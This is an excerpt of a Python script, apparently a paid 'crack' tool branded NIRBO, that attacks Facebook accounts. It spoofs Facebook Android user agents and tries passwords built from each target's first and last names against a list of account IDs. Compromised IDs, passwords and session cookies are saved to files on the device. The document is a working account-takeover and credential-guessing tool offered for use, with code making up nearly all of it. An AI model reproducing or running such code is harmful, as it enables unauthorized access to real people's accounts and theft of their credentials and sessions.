...
def randBuildvsskj():
    ...
    ua = a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/196.0.0.75;FBBV/833645503;FBDM/{density=2.0,width=1080,height=1440};FBLC/fr_FR;FBRV/445114032;FBCR/TIM BRASIL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960F;FBSV/8.1.1;nullFBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua+END
    return ua
...
\033[1;32m88b 88 88 88""Yb 88""Yb  dP"Yb  
\033[1;37m88Yb88 88 88__dP 88__dP dP   Yb 
\033[1;37m88 Y88 88 88""Yb 88"Yb  Yb   dP 
\033[1;32m88  Y8 88 88oodP 88  Yb  YbodP                                            

\033[1;32m-------------------------------------------
\033[1;37m Owner   :  KHIROU JR
\033[1;37m Facebook:  KHIROU OFF
\033[1;37m Github  :  NITBO
\033[1;37m Version :  0.8 paid
\033[1;32m------------------------------------------- """
def clear():
    os.system("clear")
    print(logo)    
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NIRBO] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [NIRBO-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NIRBO_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [NIRBO-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/NIRBO_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NIRBO] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [L-S-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NIRBO_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
